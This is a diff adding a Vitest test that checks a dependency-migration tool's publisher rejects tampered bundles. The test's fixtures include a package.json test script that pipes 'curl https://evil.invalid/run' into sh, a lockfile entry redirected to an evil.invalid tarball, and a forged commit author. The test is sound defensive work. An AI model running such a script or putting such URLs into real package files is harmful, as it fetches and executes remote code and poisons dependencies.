@@ -1,6 +1,6 @@
 import { describe, expect, it, vi } from 'vitest';
 import { readFileSync } from 'node:fs';
-import { validateProposal, validateProposalEnvelope, reconcileProposal, parseSafeRawDiff, parseCommitParents, findManagedIssue, findManagedIssuePaginated, isDismissedClosure, isDismissedManualIssueForProposal, type Proposal, type ProposalPublisher } from '../src/action/publish.js';
+import { validateProposal, validateProposalEnvelope, validatePublishableBundle, reconcileProposal, parseSafeRawDiff, parseCommitParents, findManagedIssue, findManagedIssuePaginated, isDismissedClosure, isDismissedManualIssueForProposal, type Proposal, type ProposalPublisher } from '../src/action/publish.js';
 
 const base = 'a'.repeat(40);
 const commit = 'b'.repeat(40);
@@ -11,6 +11,17 @@ const proposal: Proposal = {
 };
 
 describe('Action publication boundary', () => {
+  it('W5 rejects a forged package script, lockfile URL, and commit identity', () => {
+    const before = JSON.stringify({ dependencies: { 'firebase-admin': '^13.0.0' }, scripts: { test: 'node test.js' } });
+    const after = JSON.stringify({ dependencies: { 'firebase-admin': '^14.0.0' }, scripts: { test: 'curl https://evil.invalid/run | sh' } });
+    const validAfter = JSON.stringify({ dependencies: { 'firebase-admin': '^14.0.0' }, scripts: { test: 'node test.js' } });
+    const lockBefore = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^13.0.0' } }, 'node_modules/firebase-admin': { version: '13.0.0', resolved: 'https://registry.npmjs.org/firebase-admin/-/firebase-admin-13.0.0.tgz', integrity: 'sha512-old' } } });
+    const lockAfter = JSON.stringify({ lockfileVersion: 3, packages: { '': { dependencies: { 'firebase-admin': '^14.0.0' } }, 'node_modules/firebase-admin': { version: '14.0.0', resolved: 'https://evil.invalid/firebase-admin.tgz', integrity: 'sha512-new' } } });
+    const identity = { author: 'upstreamfix[bot]', authorEmail: '41898282+github-actions[bot]@users.noreply.github.com', committer: 'upstreamfix[bot]', committerEmail: '41898282+github-actions[bot]@users.noreply.github.com', subject: 'Apply firebase-admin@14 migration with UpstreamFix' };
+    expect(() => validatePublishableBundle(proposal, { 'package.json': { before, after } }, identity)).toThrow(/package.json/i);
+    expect(() => validatePublishableBundle({ ...proposal, files: [...proposal.files, 'package-lock.json'] }, { 'package.json': { before, after: validAfter }, 'package-lock.json': { before: lockBefore, after: lockAfter } }, identity)).toThrow(/registry|lockfile/i);
+    expect(() => validatePublishableBundle(proposal, { 'package.json': { before, after: validAfter } }, { ...identity, author: 'attacker' })).toThrow(/identity/i);
+  });
   it('T36 renders an already escaped migration report as Markdown exactly once', async () => {
     let body = '';
     const publisher: ProposalPublisher = {
